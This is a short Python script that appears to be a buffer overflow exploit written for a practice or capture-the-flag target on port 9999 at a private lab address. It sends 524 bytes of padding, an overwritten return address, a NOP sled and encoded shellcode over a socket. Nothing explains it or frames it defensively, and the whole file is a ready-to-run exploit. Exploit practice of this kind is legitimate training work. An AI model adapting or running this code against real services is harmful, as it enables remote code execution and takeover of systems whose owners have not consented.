#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.140.189"

port = 9999
timeout = 5



# #eip offset 524
# #esp offset 472
offset = 524
of = "A" *offset 
retn = "\xf3\x12\x17\x31"
# Bad chars \x00\x01
payload = ("\xb8\xcb\xaf\x87\x9f\xd9\xca\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x12\x31\x43\x12\x03\x43\x12\x83\x20\x53\x65\x6a\x87\x77\x9d"
"\x76\xb4\xc4\x31\x13\x38\x42\x54\x53\x5a\x99\x17\x07\xfb\x91"
"\x27\xe5\x7b\x98\x2e\x0c\x13\x11\xd9\x31\xf9\x4d\xdb\xcd\xe8"
"\x52\x52\x2c\xa2\x0b\x35\xfe\x91\x60\xb6\x89\xf4\x4a\x39\xdb"
"\x9e\x3a\x15\xaf\x36\xab\x46\x60\xa4\x42\x10\x9d\x7a\xc6\xab"
"\x83\xca\xe3\x66\xc3")
padding = "\x90"*16
buf = of + retn + padding + payload

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(bytes(buf+"\n", "latin-1"))
s.close()
print("Done!")